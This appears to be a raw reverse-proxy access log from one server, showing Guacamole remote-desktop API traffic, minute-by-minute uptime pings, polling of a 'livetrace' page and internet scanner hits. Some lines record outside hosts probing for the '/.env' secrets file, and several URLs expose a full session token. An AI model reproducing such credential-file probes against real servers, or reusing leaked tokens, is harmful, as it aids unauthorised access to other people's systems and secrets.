129.55.200.20 - - [14/Dec/2023:22:00:44 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3659 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:22:00:44 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 3661 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:22:00:44 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 3664 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:22:00:44 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 3662 "guacamole@docker" "http://172.25.0.9:8080" 53ms
129.55.200.20 - - [14/Dec/2023:22:00:44 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 741 "-" "-" 3660 "guacamole@docker" "http://172.25.0.9:8080" 70ms
129.55.200.20 - - [14/Dec/2023:22:00:44 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 3663 "guacamole@docker" "http://172.25.0.9:8080" 68ms
129.55.200.20 - - [14/Dec/2023:22:00:44 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree?permission=UPDATE&permission=DELETE HTTP/2.0" 200 1632 "-" "-" 3665 "guacamole@docker" "http://172.25.0.9:8080" 61ms
129.55.200.20 - - [14/Dec/2023:22:00:44 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 214 "-" "-" 3666 "guacamole@docker" "http://172.25.0.9:8080" 39ms
129.55.200.20 - - [14/Dec/2023:22:00:47 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3667 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:22:00:47 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 3669 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:22:00:47 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 214 "-" "-" 3668 "guacamole@docker" "http://172.25.0.9:8080" 49ms
129.55.200.20 - - [14/Dec/2023:22:01:22 +0000] "GET /guacamole/ HTTP/2.0" 304 0 "-" "-" 3670 "guacamole@docker" "http://172.25.0.9:8080" 2ms
129.55.200.20 - - [14/Dec/2023:22:01:22 +0000] "GET /guacamole/app.css?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 3671 "guacamole@docker" "http://172.25.0.9:8080" 2ms
129.55.200.20 - - [14/Dec/2023:22:01:22 +0000] "GET /guacamole/app.js?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 3672 "guacamole@docker" "http://172.25.0.9:8080" 1ms
129.55.200.20 - - [14/Dec/2023:22:01:23 +0000] "GET /guacamole/api/patches HTTP/2.0" 200 340 "-" "-" 3674 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:22:01:23 +0000] "GET /guacamole/api/languages HTTP/2.0" 200 244 "-" "-" 3673 "guacamole@docker" "http://172.25.0.9:8080" 12ms
129.55.200.20 - - [14/Dec/2023:22:01:23 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3675 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:22:01:23 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 3680 "guacamole@docker" "http://172.25.0.9:8080" 3ms
129.55.200.20 - - [14/Dec/2023:22:01:23 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 3678 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:22:01:23 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 3677 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:22:01:23 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 3676 "guacamole@docker" "http://172.25.0.9:8080" 81ms
129.55.200.20 - - [14/Dec/2023:22:01:23 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 741 "-" "-" 3679 "guacamole@docker" "http://172.25.0.9:8080" 82ms
129.55.200.20 - - [14/Dec/2023:22:01:23 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 3683 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:22:01:23 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 3681 "guacamole@docker" "http://172.25.0.9:8080" 42ms
129.55.200.20 - - [14/Dec/2023:22:01:23 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 214 "-" "-" 3682 "guacamole@docker" "http://172.25.0.9:8080" 47ms
159.203.109.206 - - [14/Dec/2023:22:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3684 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:22:01:25 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3685 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:22:01:25 +0000] "GET /guacamole/api/session/data/mysql/connections/5 HTTP/2.0" 200 296 "-" "-" 3686 "guacamole@docker" "http://172.25.0.9:8080" 18ms
129.55.200.20 - - [14/Dec/2023:22:01:25 +0000] "GET /guacamole/api/session/tunnels/b97c435e-52c8-3488-ab14-4eccc7a6f861/protocol HTTP/2.0" 200 2512 "-" "-" 3688 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:22:01:25 +0000] "GET /guacamole/api/session/tunnels/b97c435e-52c8-3488-ab14-4eccc7a6f861/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 3689 "guacamole@docker" "http://172.25.0.9:8080" 57ms
167.71.120.76 - - [14/Dec/2023:22:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3690 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3691 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3692 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3693 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3694 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3695 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3696 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3697 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3698 "www@docker" "http://172.25.0.8:80" 1ms
8.222.253.90 - - [14/Dec/2023:22:05:44 +0000] "POST /dns-query HTTP/2.0" 404 19 "-" "-" 3699 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:22:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3700 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3701 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3702 "www@docker" "http://172.25.0.8:80" 35ms
167.71.120.76 - - [14/Dec/2023:22:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3703 "www@docker" "http://172.25.0.8:80" 19ms
159.203.109.206 - - [14/Dec/2023:22:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3704 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3705 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3706 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3707 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3708 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3709 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3710 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3711 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:22:01:25 +0000] "GET /guacamole/websocket-tunnel?token=358C8346D924D3C0D4AB0C7E3F2DB99A7CF8A66D191427CD67F98595FC9768CF&GUAC_DATA_SOURCE=mysql&GUAC_ID=5&GUAC_TYPE=c&GUAC_WIDTH=2880&GUAC_HEIGHT=1666&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 3687 "guacamole@docker" "http://172.25.0.9:8080" 650157ms
159.203.109.206 - - [14/Dec/2023:22:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3712 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3713 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:56:01 +0000] "GET /guacamole/websocket-tunnel?token=358C8346D924D3C0D4AB0C7E3F2DB99A7CF8A66D191427CD67F98595FC9768CF&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=2880&GUAC_HEIGHT=1666&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 3605 "guacamole@docker" "http://172.25.0.9:8080" 1022282ms
159.203.109.206 - - [14/Dec/2023:22:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3714 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3715 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:22:13:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3716 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:22:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3717 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3718 "www@docker" "http://172.25.0.8:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:15:17 +0000] "GET /trace/ HTTP/2.0" 200 753 "-" "-" 3719 "livetrace@docker" "http://172.25.0.5:80" 5036ms
172.59.228.13 - - [14/Dec/2023:22:15:22 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 3720 "livetrace@docker" "http://172.25.0.5:80" 0ms
172.59.228.13 - - [14/Dec/2023:22:15:22 +0000] "GET /trace/styles.css HTTP/2.0" 304 0 "-" "-" 3721 "livetrace@docker" "http://172.25.0.5:80" 0ms
172.59.228.13 - - [14/Dec/2023:22:15:23 +0000] "GET /trace/start.php?id=zfdld74ft HTTP/2.0" 200 103 "-" "-" 3722 "livetrace@docker" "http://172.25.0.5:80" 3ms
159.203.109.206 - - [14/Dec/2023:22:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3723 "www@docker" "http://172.25.0.8:80" 0ms
172.59.228.13 - - [14/Dec/2023:22:15:24 +0000] "GET /trace/poll.php?id=zfdld74ft HTTP/2.0" 200 83 "-" "-" 3724 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:15:24 +0000] "GET /trace/ HTTP/2.0" 200 753 "-" "-" 3725 "livetrace@docker" "http://172.25.0.5:80" 5007ms
172.59.228.13 - - [14/Dec/2023:22:15:29 +0000] "GET /trace/start.php?id=tfvqj60jy HTTP/2.0" 200 103 "-" "-" 3726 "livetrace@docker" "http://172.25.0.5:80" 3ms
172.59.228.13 - - [14/Dec/2023:22:15:31 +0000] "GET /trace/poll.php?id=tfvqj60jy HTTP/2.0" 200 83 "-" "-" 3727 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:15:32 +0000] "GET /trace/poll.php?id=tfvqj60jy HTTP/2.0" 200 83 "-" "-" 3728 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.59.228.13 - - [14/Dec/2023:22:15:33 +0000] "GET /trace/poll.php?id=tfvqj60jy HTTP/2.0" 200 83 "-" "-" 3729 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:15:34 +0000] "GET /trace/poll.php?id=tfvqj60jy HTTP/2.0" 200 83 "-" "-" 3730 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:15:35 +0000] "GET /trace/poll.php?id=tfvqj60jy HTTP/2.0" 200 83 "-" "-" 3731 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.59.228.13 - - [14/Dec/2023:22:15:36 +0000] "GET /trace/poll.php?id=tfvqj60jy HTTP/2.0" 200 83 "-" "-" 3732 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:15:37 +0000] "GET /trace/poll.php?id=tfvqj60jy HTTP/2.0" 200 83 "-" "-" 3733 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3734 "www@docker" "http://172.25.0.8:80" 0ms
172.59.228.13 - - [14/Dec/2023:22:15:39 +0000] "GET /trace/poll.php?id=tfvqj60jy HTTP/2.0" 200 83 "-" "-" 3735 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:15:41 +0000] "GET /trace/poll.php?id=tfvqj60jy HTTP/2.0" 200 83 "-" "-" 3736 "livetrace@docker" "http://172.25.0.5:80" 1ms
71.6.134.231 - - [14/Dec/2023:22:16:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3737 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:22:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3738 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3739 "www@docker" "http://172.25.0.8:80" 0ms
118.193.38.251 - - [14/Dec/2023:22:16:52 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3740 "-" "-" 0ms
118.193.38.251 - - [14/Dec/2023:22:17:11 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 3741 "-" "-" 0ms
118.193.38.251 - - [14/Dec/2023:22:17:12 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 3742 "-" "-" 0ms
118.193.38.251 - - [14/Dec/2023:22:17:12 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 3743 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:22:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3744 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3745 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3746 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3747 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3748 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3749 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3750 "www@docker" "http://172.25.0.8:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:20:37 +0000] "GET /trace/poll.php?id=tfvqj60jy HTTP/2.0" 200 245 "-" "-" 3751 "livetrace@docker" "http://172.25.0.5:80" 2ms
167.71.120.76 - - [14/Dec/2023:22:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3752 "www@docker" "http://172.25.0.8:80" 0ms
172.59.228.13 - - [14/Dec/2023:22:20:38 +0000] "GET /trace/ HTTP/2.0" 200 753 "-" "-" 3753 "livetrace@docker" "http://172.25.0.5:80" 7ms
172.59.228.13 - - [14/Dec/2023:22:20:38 +0000] "GET /trace/start.php?id=a6kd6pu58 HTTP/2.0" 200 103 "-" "-" 3754 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.59.228.13 - - [14/Dec/2023:22:20:40 +0000] "GET /trace/poll.php?id=a6kd6pu58 HTTP/2.0" 200 83 "-" "-" 3755 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.59.228.13 - - [14/Dec/2023:22:20:41 +0000] "GET /trace/poll.php?id=a6kd6pu58 HTTP/2.0" 200 83 "-" "-" 3756 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:20:42 +0000] "GET /trace/poll.php?id=a6kd6pu58 HTTP/2.0" 200 83 "-" "-" 3757 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.59.228.13 - - [14/Dec/2023:22:20:43 +0000] "GET /trace/poll.php?id=a6kd6pu58 HTTP/2.0" 200 83 "-" "-" 3758 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.59.228.13 - - [14/Dec/2023:22:20:44 +0000] "GET /trace/poll.php?id=a6kd6pu58 HTTP/2.0" 200 83 "-" "-" 3759 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.59.228.13 - - [14/Dec/2023:22:20:45 +0000] "GET /trace/poll.php?id=a6kd6pu58 HTTP/2.0" 200 83 "-" "-" 3760 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:20:46 +0000] "GET /trace/poll.php?id=a6kd6pu58 HTTP/2.0" 200 83 "-" "-" 3761 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:20:47 +0000] "GET /trace/poll.php?id=a6kd6pu58 HTTP/2.0" 200 83 "-" "-" 3762 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:20:48 +0000] "GET /trace/poll.php?id=a6kd6pu58 HTTP/2.0" 200 83 "-" "-" 3763 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:20:49 +0000] "GET /trace/poll.php?id=a6kd6pu58 HTTP/2.0" 200 83 "-" "-" 3764 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.228.13 - - [14/Dec/2023:22:20:50 +0000] "GET /trace/poll.php?id=a6kd6pu58 HTTP/2.0" 200 83 "-" "-" 3765 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3766 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3767 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3768 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3769 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3770 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3771 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3772 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3773 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3774 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3775 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3776 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3777 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3778 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3779 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3780 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3781 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3782 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3783 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3784 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3785 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3786 "www@docker" "http://172.25.0.8:80" 1ms
205.210.31.253 - - [14/Dec/2023:22:31:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3787 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:22:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3788 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3789 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3790 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3791 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3792 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3793 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3794 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3795 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3796 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3797 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3798 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3799 "www@docker" "http://172.25.0.8:80" 1ms
54.37.79.75 - - [14/Dec/2023:22:37:30 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3800 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [14/Dec/2023:22:37:30 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3801 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:22:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3802 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3803 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3804 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3805 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3806 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3807 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:22:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3808 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3809 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3810 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:22:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3811 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3812 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3813 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3814 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:22:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3815 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:22:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3816 "www@docker" "http://172.25.0.8:80" 0ms
54.36.115.221 - - [14/Dec/2023:22:44:54 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3817 "web-to-websecure@internal" "-" 0ms
